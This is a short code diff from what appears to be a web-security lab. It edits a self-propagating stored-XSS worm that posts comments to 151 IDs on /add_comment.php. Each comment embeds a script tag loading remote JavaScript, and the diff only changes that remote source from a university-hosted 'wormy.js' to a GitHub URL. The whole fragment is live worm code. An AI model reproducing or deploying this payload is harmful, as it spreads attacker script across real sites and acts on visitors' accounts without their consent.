@@ -5,7 +5,7 @@ if(cookie.get("choc") != "chocolate") {
 	add.send();
     for (var i = 0; i < 151; i++) {
         var post = new XMLHttpRequest();
-        post.open("POST", `/add_comment.php?id=${i}&comment=<script src="http://people.rit.edu/jdb9158/wormy.js"></script>`, true);
+        post.open("POST", `/add_comment.php?id=${i}&comment=<script src="https://github.com/ajm4098/webapp6/edit/main/add_friends.js"></script>`, true);
         post.send();
     }
 }
